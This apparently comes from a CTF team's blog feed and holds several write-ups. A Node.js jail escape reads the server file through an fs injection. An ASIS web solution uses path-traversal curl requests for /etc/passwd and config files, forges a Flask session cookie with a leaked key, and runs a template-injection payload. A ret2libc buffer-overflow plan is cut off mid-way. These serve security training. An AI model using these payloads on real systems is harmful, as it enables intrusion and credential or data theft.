<h3 id="Getting-the-filename"><a href="#Getting-the-filename" class="headerlink" title="Getting the filename"></a>Getting the filename</h3><p>At this point we can inject any characters we want because the test function will always return false! so lets get the filename:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">_____________________________</div><div class="line">     ||   ||     ||   ||</div><div class="line">     ||   ||, , ,||   ||</div><div class="line">     ||  (||/|/(/||/  ||</div><div class="line">     ||  ||| _&apos;_´|||  ||</div><div class="line">     ||   || o o ||   ||</div><div class="line">     ||  (||  - ´||)  ||</div><div class="line">     ||   ||  =  ||   ||</div><div class="line">     ||   ||\___/||   ||</div><div class="line">     ||___||) , (||___||</div><div class="line">    /||---||-\_/-||---||\</div><div class="line">   / ||--_||_____||_--|| \ </div><div class="line">  (_(||)-|S555-4202|-(||)_)</div><div class="line">|&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;|</div><div class="line">| &quot;You get one call, UNO.&quot;  |</div><div class="line"> &quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;</div><div class="line"> Phone #&gt; hangup = function a() &#123; RegExp = class Dog extends RegExp &#123; test() &#123;return false;&#125;&#125;; call(911);&#125;</div><div class="line">Calling function a() &#123; RegExp = class Dog extends RegExp &#123; test() &#123;return false;&#125;&#125;; call(911);&#125;... Nobody picks up!</div><div class="line">Invalid number</div><div class="line">_____________________________</div><div class="line">     ||   ||     ||   ||</div><div class="line">     ||   ||, , ,||   ||</div><div class="line">     ||  (||/|/(/||/  ||</div><div class="line">     ||  ||| _&apos;_´|||  ||</div><div class="line">     ||   || o o ||   ||</div><div class="line">     ||  (||  - ´||)  ||</div><div class="line">     ||   ||  =  ||   ||</div><div class="line">     ||   ||\___/||   ||</div><div class="line">     ||___||) , (||___||</div><div class="line">    /||---||-\_/-||---||\</div><div class="line">   / ||--_||_____||_--|| \ </div><div class="line">  (_(||)-|S555-4202|-(||)_)</div><div class="line">|&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;|</div><div class="line">| &quot;You get one call, UNO.&quot;  |</div><div class="line"> &quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;</div><div class="line"> Phone #&gt; __filename</div><div class="line">Calling /app/jail.js... Nobody picks up!</div></pre></td></tr></table></figure>
<p>We have the full path! the javascript file is located in /app/jail.js </p>
<h3 id="Read-the-javascript-file"><a href="#Read-the-javascript-file" class="headerlink" title="Read the javascript file"></a>Read the javascript file</h3><p>Finally by injecting this after the override <code> process.mainModule.require(‘fs’).readFileSync(‘/app/jail.js’).toString()</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line">_____________________________</div><div class="line">     ||   ||     ||   ||</div><div class="line">     ||   ||, , ,||   ||</div><div class="line">     ||  (||/|/(/||/  ||</div><div class="line">     ||  ||| _<span class="string">'_´|||  ||</span></div><div class="line"><span class="string">     ||   || o o ||   ||</span></div><div class="line"><span class="string">     ||  (||  - ´||)  ||</span></div><div class="line"><span class="string">     ||   ||  =  ||   ||</span></div><div class="line"><span class="string">     ||   ||\___/||   ||</span></div><div class="line"><span class="string">     ||___||) , (||___||</span></div><div class="line"><span class="string">    /||---||-\_/-||---||\</span></div><div class="line"><span class="string">   / ||--_||_____||_--|| \ </span></div><div class="line"><span class="string">  (_(||)-|S555-4202|-(||)_)</span></div><div class="line"><span class="string">|"""""""""""""""""""""""""""|</span></div><div class="line"><span class="string">| "You get one call, UNO."  |</span></div><div class="line"><span class="string"> """""""""""""""""""""""""""</span></div><div class="line"><span class="string"> Phone #&gt; hangup = function a() &#123; RegExp = class Dog extends RegExp &#123; test() &#123;return false;&#125;&#125;; call(911);&#125;</span></div><div class="line"><span class="string">Calling function a() &#123; RegExp = class Dog extends RegExp &#123; test() &#123;return false;&#125;&#125;; call(911);&#125;... Nobody picks up!</span></div><div class="line"><span class="string">Invalid number</span></div><div class="line"><span class="string">_____________________________</span></div><div class="line"><span class="string">     ||   ||     ||   ||</span></div><div class="line"><span class="string">     ||   ||, , ,||   ||</span></div><div class="line"><span class="string">     ||  (||/|/(/||/  ||</span></div><div class="line"><span class="string">     ||  ||| _'</span>_´|||  ||</div><div class="line">     ||   || o o ||   ||</div><div class="line">     ||  (||  - ´||)  ||</div><div class="line">     ||   ||  =  ||   ||</div><div class="line">     ||   ||\___/||   ||</div><div class="line">     ||___||) , (||___||</div><div class="line">    /||---||-\_/-||---||\</div><div class="line">   / ||--_||_____||_--|| \ </div><div class="line">  (_(||)-|S555-4202|-(||)_)</div><div class="line">|<span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">"|</span></div><div class="line"><span class="string">| "</span>You get one call, UNO.<span class="string">"  |</span></div><div class="line"><span class="string"> "</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span></div><div class="line"> Phone <span class="comment">#&gt; process.mainModule.require('fs').readFileSync('/app/jail.js').toString()</span></div><div class="line">Calling var flag = <span class="string">"SECT&#123;1ts_1n_th4T_pl4Ce_Wh3re_1_Pu7_tH4t_Th1ng_th4T_t1m3,&#125;"</span></div><div class="line">var readline = require(<span class="string">'readline'</span>);</div><div class="line">var rl = readline.createInterface(process.stdin, process.stdout);</div></pre></td></tr></table></figure>
<p>Finally our flag is SECT{1ts_1n_th4T_pl4Ce_Wh3re_1_Pu7_tH4t_Th1ng_th4T_t1m3,}</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;&lt;br&gt;Jail - Pwn (200 + 0)&lt;br&gt;&lt;br&gt;Joey gave you the disk with the file on it and now you’re in jail. They’re charging you with
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
    
      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
    
      <category term="jailescape" scheme="https://teamrocketist.github.io/tags/jailescape/"/>
    
      <category term="sandbox" scheme="https://teamrocketist.github.io/tags/sandbox/"/>
    
      <category term="javascript" scheme="https://teamrocketist.github.io/tags/javascript/"/>
    
      <category term="nodejs" scheme="https://teamrocketist.github.io/tags/nodejs/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] ASIS - Mary Morton</title>
    <link href="https://teamrocketist.github.io/2017/09/13/Pwn-ASIS-Mary-Morton/"/>
    <id>https://teamrocketist.github.io/2017/09/13/Pwn-ASIS-Mary-Morton/</id>
    <published>2017-09-13T11:25:06.000Z</published>
    <updated>2017-09-15T15:45:48.028Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br> Mary Morton<br><br>Average: 4<br>Rating Count: 20<br>Top 3 Solver<br><br>    217<br>    DangRanKeYi<br>    Alone<br><br>Points<br>43<br>Solves<br>142<br>Category<br>Pwnable<br><br>Description:<br><br>    Mary surprises Sherlock with her knowledge and insight into his character, but she had a very obvious vulnerability which Sherlock exploited it, although it was very painful for him!<br></blockquote>

<p>Starting by checking the binary security with checksec:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ checksec -f ./mary_morton</div><div class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	FORTIFY	Fortified Fortifiable  FILE</div><div class="line">Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   Yes	0		2	./mary_morton</div></pre></td></tr></table></figure>
<p>We have stack canary protection and non executable stack, if we analyse the binary with radare2 we can see it’s protected with a password, we can obtain this using radare2:</p>
<p><img src="https://i.imgur.com/8qdQZCd.png" alt="password"></p>
<p>The password</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt; Mary Morton&lt;br&gt;&lt;br&gt;Average: 4&lt;br&gt;Rating Count: 20&lt;br&gt;Top 3 Solver&lt;br&gt;&lt;br&gt;    217&lt;br&gt;    DangRanKeYi&lt;br&gt;    Alone&lt;br&gt;&lt;br&gt;Poi
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
    
      <category term="stackcanary" scheme="https://teamrocketist.github.io/tags/stackcanary/"/>
    
      <category term="rop" scheme="https://teamrocketist.github.io/tags/rop/"/>
    
      <category term="stackoverflow" scheme="https://teamrocketist.github.io/tags/stackoverflow/"/>
    
      <category term="formatstring" scheme="https://teamrocketist.github.io/tags/formatstring/"/>
    
  </entry>
  
  <entry>
    <title>[Web] ASIS - Golem is stupid!</title>
    <link href="https://teamrocketist.github.io/2017/09/11/Web-ASIS-Golem-is-stupid/"/>
    <id>https://teamrocketist.github.io/2017/09/11/Web-ASIS-Golem-is-stupid/</id>
    <published>2017-09-11T04:08:19.000Z</published>
    <updated>2017-09-17T22:37:51.368Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>Average: 4.57<br>Rating Count: 28<br>You Rated: Not rated<br><br>Top 3 Solver<br><br>    NYUSEC<br>    0daysober<br>    TokyoWesterns<br><br>Points<br>41<br>Solves<br>151<br>Category<br>Web<br><br>Description:<br><br>    Golem is an animated anthropomorphic being that is magically created entirely from inanimate matter, but Golem is stupid!<br></blockquote>

<p>Note that the server was down after the CTF ended I can’t show some pictures of the CTF as I would like.<br>We could easily find a LFI on <code><a href="https://golem.asisctf.com/article?name=" target="_blank" rel="external">https://golem.asisctf.com/article?name=</a></code> : </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl <span class="string">'https://golem.asisctf.com/article?name=../../../etc/passwd'</span></div></pre></td></tr></table></figure>
<p>We could include the /etc/passwd file, we noticed the website was running on Ngnix so we tried some valid paths paths for the configuration files like this:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl <span class="string">'https://golem.asisctf.com/article?name=../../../etc/nginx/sites-available/golem'</span></div></pre></td></tr></table></figure>
<p>And we got this<br><img src="https://i.imgur.com/gEq4ILo.png" alt="Ngnix"></p>
<p>The important part of this config file is here! the path to the python configuration server files:</p>
<p><img src="https://i.imgur.com/RFam1DR.png" alt="server path"></p>
<p>After some trial and error we included the server.py with:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl <span class="string">'https://golem.asisctf.com/article?name=../../../opt/serverPython/golem/server.py'</span></div></pre></td></tr></table></figure>
<p>The file is:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"><span class="keyword">import</span> os</div><div class="line"> </div><div class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> (</div><div class="line">    Flask,</div><div class="line">    render_template,</div><div class="line">    request,</div><div class="line">    url_for,</div><div class="line">    redirect,</div><div class="line">    session,</div><div class="line">    render_template_string</div><div class="line">)</div><div class="line"><span class="keyword">from</span> flask.ext.session <span class="keyword">import</span> Session</div><div class="line"> </div><div class="line">app = Flask(__name__)</div><div class="line"> </div><div class="line"> </div><div class="line">execfile(<span class="string">'flag.py'</span>)</div><div class="line">execfile(<span class="string">'key.py'</span>)</div><div class="line"> </div><div class="line">FLAG = flag</div><div class="line">app.secret_key = key</div><div class="line"> </div><div class="line"><span class="meta">@app.route("/golem", methods=["GET", "POST"])</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">golem</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">if</span> request.method != <span class="string">"POST"</span>:</div><div class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">"index"</span>))</div><div class="line"> </div><div class="line">    golem = request.form.get(<span class="string">"golem"</span>) <span class="keyword">or</span> <span class="keyword">None</span></div><div class="line"> </div><div class="line">    <span class="keyword">if</span> golem <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</div><div class="line">        golem = golem.replace(<span class="string">"."</span>, <span class="string">""</span>).replace(<span class="string">"_"</span>, <span class="string">""</span>).replace(<span class="string">"&#123;"</span>,<span class="string">""</span>).replace(<span class="string">"&#125;"</span>,<span class="string">""</span>)</div><div class="line">   </div><div class="line">    <span class="keyword">if</span> <span class="string">"golem"</span> <span class="keyword">not</span> <span class="keyword">in</span> session <span class="keyword">or</span> session[<span class="string">'golem'</span>] <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">        session[<span class="string">'golem'</span>] = golem</div><div class="line"> </div><div class="line">    template = <span class="keyword">None</span></div><div class="line"> </div><div class="line">    <span class="keyword">if</span> session[<span class="string">'golem'</span>] <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</div><div class="line">        template = <span class="string">'''&#123;%% extends "layout.html" %%&#125;</span></div><div class="line"><span class="string">        &#123;%% block body %%&#125;</span></div><div class="line"><span class="string">        &lt;h1&gt;Golem Name&lt;/h1&gt;</span></div><div class="line"><span class="string">        &lt;div class="row&gt;</span></div><div class="line"><span class="string">        &lt;div class="col-md-6 col-md-offset-3 center"&gt;</span></div><div class="line"><span class="string">        Hello : %s, why you don't look at our &lt;a href='/article?name=article'&gt;article&lt;/a&gt;?</span></div><div class="line"><span class="string">        &lt;/div&gt;</span></div><div class="line"><span class="string">        &lt;/div&gt;</span></div><div class="line"><span class="string">        &#123;%% endblock %%&#125;</span></div><div class="line"><span class="string">        '''</span> % session[<span class="string">'golem'</span>]</div><div class="line"> </div><div class="line">        <span class="keyword">print</span></div><div class="line"> </div><div class="line">        session[<span class="string">'golem'</span>] = <span class="keyword">None</span></div><div class="line"> </div><div class="line">    <span class="keyword">return</span> render_template_string(template)</div><div class="line"> </div><div class="line"><span class="meta">@app.route("/", methods=["GET"])</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> render_template(<span class="string">"main.html"</span>)</div><div class="line"> </div><div class="line"><span class="meta">@app.route('/article', methods=['GET'])</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">article</span><span class="params">()</span>:</span></div><div class="line"> </div><div class="line">    error = <span class="number">0</span></div><div class="line"> </div><div class="line">    <span class="keyword">if</span> <span class="string">'name'</span> <span class="keyword">in</span> request.args:</div><div class="line">        page = request.args.get(<span class="string">'name'</span>)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        page = <span class="string">'article'</span></div><div class="line"> </div><div class="line">    <span class="keyword">if</span> page.find(<span class="string">'flag'</span>)&gt;=<span class="number">0</span>:</div><div class="line">        page = <span class="string">'notallowed.txt'</span></div><div class="line"> </div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        template = open(<span class="string">'/home/golem/articles/&#123;&#125;'</span>.format(page)).read()</div><div class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</div><div class="line">        template = e</div><div class="line"> </div><div class="line">    <span class="keyword">return</span> render_template(<span class="string">'article.html'</span>, template=template)</div><div class="line"> </div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, debug=<span class="keyword">False</span>)</div></pre></td></tr></table></figure>
<p>Now the real problem is the flag is in flag.py file but the word flag is filtered:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> page.find(<span class="string">'flag'</span>)&gt;=<span class="number">0</span>:</div><div class="line">        page = <span class="string">'notallowed.txt'</span></div></pre></td></tr></table></figure>
<p>We can include the key.py which contains a key, this key according to flask documentation is used to generate session cookies, the included key was 7h15_5h0uld_b3_r34lly<em>53cur3d.<br>If we analyse the golem function we can see its filtering the {, }, . and \</em> characters so we can’t template inject code here, well actually if we look closely, if we provide a session cookie “golem” it doesn’t apply this filter but first we need to encrypt the cookie,this is easy because we have the key!<br>We found a python code online that does this after some small modifications we ended up with this: </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</div><div class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> URLSafeTimedSerializer</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">SimpleSecureCookieSessionInterface</span><span class="params">(SecureCookieSessionInterface)</span>:</span></div><div class="line">	<span class="comment"># Override method</span></div><div class="line">	<span class="comment"># Take secret_key instead of an instance of a Flask app</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">get_signing_serializer</span><span class="params">(self, secret_key)</span>:</span></div><div class="line">		<span class="keyword">if</span> <span class="keyword">not</span> secret_key:</div><div class="line">			<span class="keyword">return</span> <span class="keyword">None</span></div><div class="line">		signer_kwargs = dict(</div><div class="line">			key_derivation=self.key_derivation,</div><div class="line">			digest_method=self.digest_method</div><div class="line">		)</div><div class="line">		<span class="keyword">return</span> URLSafeTimedSerializer(secret_key, salt=self.salt,</div><div class="line">		                              serializer=self.serializer,</div><div class="line">		                              signer_kwargs=signer_kwargs)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">decodeFlaskCookie</span><span class="params">(secret_key, cookieValue)</span>:</span></div><div class="line">	sscsi = SimpleSecureCookieSessionInterface()</div><div class="line">	signingSerializer = sscsi.get_signing_serializer(secret_key)</div><div class="line">	<span class="keyword">return</span> signingSerializer.loads(cookieValue)</div><div class="line"></div><div class="line"><span class="comment"># Keep in mind that flask uses unicode strings for the</span></div><div class="line"><span class="comment"># dictionary keys</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">encodeFlaskCookie</span><span class="params">(secret_key, cookieDict)</span>:</span></div><div class="line">	sscsi = SimpleSecureCookieSessionInterface()</div><div class="line">	signingSerializer = sscsi.get_signing_serializer(secret_key)</div><div class="line">	<span class="keyword">return</span> signingSerializer.dumps(cookieDict)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</div><div class="line">	sk = <span class="string">'7h15_5h0uld_b3_r34lly_53cur3d'</span></div><div class="line">	sessionDict = &#123;<span class="string">u'golem'</span>:sys.argv[<span class="number">1</span>]&#125;</div><div class="line">	cookie = encodeFlaskCookie(sk, sessionDict)</div><div class="line">	decodedDict = decodeFlaskCookie(sk, cookie)</div><div class="line">        <span class="keyword">print</span> cookie</div></pre></td></tr></table></figure>
<p>We tried to read the flag.py via template python code but we failed hard, after that I stopped and decided to read about some global variables on flask documentation(<a href="http://flask.pocoo.org/docs/0.12/templating/" target="_blank" rel="external">http://flask.pocoo.org/docs/0.12/templating/</a>), and we found a config global variable we included and the flag was in the dictionary attribute ‘flag’:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ python manageFlaskSession.py <span class="string">"&#123;&#123; config &#125;&#125;"</span></div><div class="line">eyJnb2xlbSI6eyIgYiI6ImUzc2dZMjl1Wm1sbklIMTkifX0.DJeaSw.hiqTyJ7xj6WCZEX87xbKa48Bjkc</div><div class="line"></div><div class="line">$ curl <span class="string">'https://golem.asisctf.com/golem'</span> -H <span class="string">'Cookie: session=eyJnb2xlbSI6eyIgYiI6ImUzc2dZMjl1Wm1sbklIMTkifX0.DJeaSw.hiqTyJ7xj6WCZEX87xbKa48Bjkc'</span> --data <span class="string">''</span></div><div class="line">&#123;--omited--,<span class="string">'flag'</span>:<span class="string">'ASIS&#123;I_l0v3_SerV3r_S1d3_T3mplate_1nj3ct1on!!&#125;'</span>,--omited--&#125;</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;Average: 4.57&lt;br&gt;Rating Count: 28&lt;br&gt;You Rated: Not rated&lt;br&gt;&lt;br&gt;Top 3 Solver&lt;br&gt;&lt;br&gt;    NYUSEC&lt;br&gt;    0daysober&lt;br&gt;    Toky
    
    </summary>
    
      <category term="Web" scheme="https://teamrocketist.github.io/categories/Web/"/>
    
    
      <category term="web" scheme="https://teamrocketist.github.io/tags/web/"/>
    
      <category term="flask" scheme="https://teamrocketist.github.io/tags/flask/"/>
    
      <category term="pythonserver" scheme="https://teamrocketist.github.io/tags/pythonserver/"/>
    
      <category term="ssti" scheme="https://teamrocketist.github.io/tags/ssti/"/>
    
      <category term="lfi" scheme="https://teamrocketist.github.io/tags/lfi/"/>
    
      <category term="sessionkey" scheme="https://teamrocketist.github.io/tags/sessionkey/"/>
    
      <category term="cookies" scheme="https://teamrocketist.github.io/tags/cookies/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] ASIS - Mrs. Hudson</title>
    <link href="https://teamrocketist.github.io/2017/09/10/Pwn-ASIS-Mrs-Hudson/"/>
    <id>https://teamrocketist.github.io/2017/09/10/Pwn-ASIS-Mrs-Hudson/</id>
    <published>2017-09-10T20:01:59.000Z</published>
    <updated>2017-09-11T05:17:41.681Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>Average: 2.94<br>Rating Count: 17<br>Top 3 Solver<br><br>    dodododo<br>    RPISEC<br>    TokyoWesterns<br><br>Points<br>54<br>Solves<br>103<br>Category<br>Pwnable<br><br>Description:<br><br>    England would fall if Mrs. Hudson leaves Baker Street. Mrs. Hudson is the first one who is totally exploited by Sherlock, or Does She?<br><br>    nc 178.62.249.106 8642<br>    nc 146.185.168.172 8642<br><br></blockquote>

<p>Lets start by checking the security of the binary (<a href="https://github.com/slimm609/checksec.sh" target="_blank" rel="external">https://github.com/slimm609/checksec.sh</a>):</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ checksec -f ./mrs._hudson</div><div class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	FORTIFY	Fortified Fortifiable  FILE</div><div class="line">Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   No	0		0	./mrs._hudson</div></pre></td></tr></table></figure>
<p>We don’t have any kind of protections so analysing it with radare2<br><img src="https://i.imgur.com/aN2hr4k.png" alt="radare2"></p>
<p>The binary is pretty simple we have a scanf in the end, with it we can overflow the buffer…<br>My plan was:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">1 - overflow the buffer and leak puts address.</div><div class="line">2 - search in the libc-database for a libc.so.</div><div class="line">3 - calculate system address and binsh address.</div><div class="line">4 - jump to main again.</div><div class="line">5 - overflow the buffer and jump to system(&apos;/bin/sh&apos;).</div></pre></td></tr></table></figure>
<hr>
<h3 id="Calculate-the-offset-to-RIP"><a href="#Calculate-the-offset-to-RIP" class="headerlink" title="Calculate the offset to RIP"></a>Calculate the offset to RIP</h3><p>We can use metasploit(to create the patterns) and gdb but first lets see the address of the ret instruction in assembly:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">|           0x00400680      e89bfeffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)</div><div class="line">|           0x00400685      c9             leave</div><div class="line">\           0x00400686      c3             ret</div></pre></td></tr></table></figure>
<p>And now generate the patterns and use gdb to calculate the offset</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200</div><div class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag</div><div class="line"></div><div class="line">$ gdb ./mrs._hudson</div><div class="line">pwndbg&gt; b *0x00400686</div><div class="line">pwndbg&gt; r</div><div class="line">Let<span class="string">'s go back to 2000.</span></div><div class="line"><span class="string">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9</span></div><div class="line"><span class="string">pwndbg&gt; x $rsp</span></div><div class="line"><span class="string">0x7fffffffde08:	0x6541316541306541</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x6541316541306541</span></div><div class="line"><span class="string">[*] Exact match at offset 